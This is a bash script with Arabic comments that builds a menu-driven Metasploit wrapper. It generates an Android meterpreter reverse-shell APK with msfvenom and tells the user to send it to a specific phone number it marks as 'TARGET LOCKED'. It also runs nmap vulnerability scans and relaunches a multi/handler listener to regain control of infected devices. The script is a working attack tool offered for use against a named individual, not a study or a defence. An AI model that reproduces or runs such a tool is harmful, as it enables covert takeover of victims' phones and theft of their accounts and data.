cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: STUDIO | xxszmsx
# VERSION: 5.0 (PRIVATE EDITION)
# PLATFORM: MULTI (KALI / TERMUX)
# =====================================================

# الألوان للتنسيق
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'

# اكتشاف النظام تلقائياً لتحديد مسارات الحفظ
if [[ -d "/data/data/com.termux/files/usr/bin" ]]; then
    OS="TERMUX"
    SAVE_PATH="/sdcard/mazen_hacker.apk"
    DB_FILE="$HOME/.studio_data"
else
    OS="KALI-LINUX"
    SAVE_PATH="$(pwd)/mazen_hacker.apk"
    DB_FILE=".studio_data"
fi

save_cfg() { echo "$1:$2" > "$DB_FILE"; }
load_cfg() { if [ -f "$DB_FILE" ]; then cat "$DB_FILE"; fi; }

# --- [ بوابة الدخول الآمنة ] ---
clear
echo -e "${RED}====================================================="
echo -e "          STUDIO | xxszmsx - PRIVATE ACCESS          "
echo -e "=====================================================${NC}"
read -s -p "[?] Password: " p; echo ""
if [ "$p" != "mazen2014" ]; then echo "Unauthorized!"; exit 1; fi

while true; do
    clear
    echo -e "${RED}"
    echo "  ██████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ "
    echo " ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗"
    echo " ╚█████╗    ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo "  ╚═══██╗   ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo " ██████╔╝   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝"
    echo " ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ "
    echo -e "${YELLOW}        [ STUDIO | xxszmsx ] - [ SYSTEM: $OS ]${NC}"
    echo "-----------------------------------------------------"
    echo -e "   [!] TARGET LOCKED: +965 41022932 | STATUS: READY "
    echo "-----------------------------------------------------"
    echo -e "1) Android Exploit (فيروس الاختراق وصيد الحسابات)"
    echo -e "2) Web Vuln Scanner (فحص ثغرات المواقع والشبكات)"
    echo -e "3) Re-Connect Mode (استعادة السيطرة المحفوظة)"
    echo -e "4) Settings (تعديل كود الأداة)"
    echo -e "0) Exit (خروج آمن)"
    echo "-----------------------------------------------------"
    read -p "Studio >> " choice

    case $choice in
        1) 
           read -p "Enter LHOST (IP): " lh; read -p "Enter LPORT: " lp
           save_cfg "$lh" "$lp"
           echo -e "${YELLOW}[*] Generating Payload...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_PATH"
           echo -e "${GREEN}[+] Done! File saved at: $SAVE_PATH${NC}"
           echo -e "${BLUE}[!] Send this to target +965 41022932${NC}"
           ;;
        2) 
           read -p "Target IP/URL: " t_url; nmap -sV --script=vuln "$t_url" ;;
        3) 
           cfg=$(load_cfg)
           if [ -z "$cfg" ]; then echo "No data found!"; sleep 1; continue; fi
           IP=$(echo $cfg | cut -d: -f1); PORT=$(echo $cfg | cut -d: -f2)
           echo -e "${GREEN}[*] Re-opening Master Controller on $IP:$PORT...${NC}"
           msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j" ;;
        4) nano xxszmsx.sh ;;
        0) echo -e "${GREEN}Safe Exit.${NC}"; exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
EOF

chmod +x xxszmsx.sh
./xxszmsx.sh

